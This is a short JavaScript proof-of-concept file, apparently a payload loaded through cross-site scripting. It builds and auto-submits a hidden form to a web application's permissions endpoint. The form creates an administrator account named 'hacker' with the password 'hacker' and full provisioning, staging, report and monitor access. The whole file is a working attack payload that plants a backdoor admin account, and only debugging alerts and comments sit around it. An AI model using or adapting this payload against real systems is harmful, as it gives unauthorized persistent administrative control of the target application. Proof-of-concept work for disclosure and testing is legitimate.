// remove the alert prompts we used for debugging
// can be vastly improved. PoC made by copy pasting from stack overflow
alert("This is a remote script executing!")
alert("Going to add a user now, named hacker, with password of hacker.")
function post(path, params, method) {
    method = method || "post";
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
         }
    }

    document.body.appendChild(form);
    form.submit();
}
function mkuser(){
    post("/web/web?page=permissions&cmd=create&async=true",{page: "permissions", cmd: "create", async: "true", header: "true", user_name: "hacker", user_fullname: "hacker", user_pass: "hacker", user_admin: "true", configure: "true", web_access: "support", web_access: "limited-provisioning", web_access: "full-provisioning", web_access: "report", web_access: "staging", web_access: "monitor", unittype: ".", detailsubmit: "Create new user"})
}

setTimeout(mkuser, 1000) // I cant remember why I used setTimeout
